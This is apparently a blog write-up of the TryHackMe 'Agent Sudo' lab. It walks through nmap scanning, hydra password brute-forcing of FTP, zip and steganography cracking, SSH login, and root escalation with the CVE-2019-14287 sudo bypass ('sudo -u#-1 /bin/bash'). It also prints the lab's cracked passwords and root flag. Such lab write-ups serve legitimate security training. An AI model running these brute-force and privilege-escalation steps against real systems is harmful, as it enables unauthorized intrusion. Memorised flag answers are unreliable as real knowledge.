---
title: "Tryhackme - Agent Sudo WriteUp"
date: 2020-10-23
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---


# TryHackMe - Agent Sudo WriteUp


**Keywords:** changing user-agent, binwalk, zip2john, john, steghide, cve-2019-14287, sudo exploit


Potential Users:
chris


## Information Gathering


### nmap

```
root@kali:~/TryHackMe# nmap -sV -sC -p- -T4 -A --script vuln 10.10.238.253
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_sslv2-drown:
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
```


## Enumeration


### curl

```
root@kali:~/TryHackMe# curl http://10.10.238.253 -H "User-Agent: C" -L
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

-	**-L**: this option will make curl redo the request on the new place. (3xx Request ~ Redirection)
-	**-H**: header of the file


### hydra

```
root@kali:~/TryHackMe# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.238.253 -t 8
[21][ftp] host: 10.10.238.253   login: chris   password: crystal
```


### ftp

```
root@kali:~/TryHackMe# ftp 10.10.238.253
Name (10.10.238.253:root): chris
Password: crystal
ftp> dir
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
ftp> get To_agentJ.txt
ftp> get cute-alien.jpg
ftp> get cutie.png
```


### binwalk

binwalk - tool for searching binary images for embedded files and executable code

```
root@kali:~/TryHackMe# binwalk -e cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

root@kali:~/TryHackMe# binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```


### zip2john

```
root@kali:~/TryHackMe/_cutie.png.extracted# zip2john 8702.zip > hash
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
```


### john

```
root@kali:~/TryHackMe/_cutie.png.extracted# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
```


### base64

```
root@kali:~/TryHackMe/_cutie.png.extracted# cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
root@kali:~/TryHackMe/_cutie.png.extracted# echo "QXJlYTUx" | base64 -d
Area51
```


### steghide

```
root@kali:~/TryHackMe# steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
root@kali:~/TryHackMe# cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```


### ssh

```
root@kali:~/TryHackMe# ssh james@10.10.238.253
james@10.10.238.253's password: hackerrules!
james@agent-sudo:~$
```


## Privilege Escalation

The sudo vulnerability CVE-2019-14287 is a security policy bypass issue that provides a user or a program the ability to execute commands as root on a Linux system when the "sudoers configuration" explicitly disallows the root access.

Exploiting the vulnerability requires the user to have sudo privileges that allow them to run commands with an arbitrary user ID, except root.

**The following terms need to be met before exploiting:**

1.	/etc/sudoers file, a user should be granted permission to execute programs as any users except root.
2.	user has sudo privileges that allow them to run commands with an arbitrary user ID.


**Exploit**

Run Sudo command with User ID -1 or 4294967295

```
cat /etc/sudoers
```

```
sudo -u#-1 /bin/bash
```



```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root# 

```



